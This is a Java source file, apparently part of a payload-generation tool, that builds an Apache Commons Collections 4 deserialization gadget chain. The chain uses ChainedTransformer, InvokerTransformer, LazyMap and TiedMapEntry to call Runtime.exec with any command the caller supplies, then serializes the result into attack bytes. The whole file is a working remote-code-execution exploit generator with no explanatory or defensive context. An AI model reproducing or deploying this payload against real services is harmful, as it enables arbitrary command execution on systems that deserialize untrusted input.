package cn.safe6.payload.shortPayload.payload;


import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CCK4 extends Payload {
    @SuppressWarnings("all")
    public static byte[] getPayloadUseCommand(String cmd) {
        try {
            final Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{
                            String.class, Class[].class}, new Object[]{
                            "getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{
                            Object.class, Object[].class}, new Object[]{
                            null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class}, new Object[]{cmd}),
                    new ConstantTransformer(new HashSet<String>())};
            ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});
            HashMap<String, String> innerMap = new HashMap<String, String>();
            Map m = LazyMap.lazyMap(innerMap, inertChain);
            Map outerMap = new HashMap();
            TiedMapEntry tied = new TiedMapEntry(m, "v");
            outerMap.put(tied, "t");
            innerMap.clear();
            setFieldValue(inertChain, "iTransformers", transformers);
            return serialize(outerMap);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
